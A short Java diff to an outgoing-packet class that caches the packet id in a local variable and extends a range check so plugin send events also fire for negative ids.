@@ -15,8 +15,10 @@ public abstract class AbstractOutgoingPacket {
 	
 	public synchronized final void send(Slave slave, DataOutputStream dos) {
 		try {
-			if (getPacketId() > PacketRange.outgoingRange) {
-				PluginEventHandler.onSendPacket(getPacketId(), slave);
+			byte id = getPacketId();
+			
+			if (id < 0 || id > PacketRange.outgoingRange) {
+				PluginEventHandler.onSendPacket(id, slave);
 			}
 			
 			dos.writeByte(getPacketId());
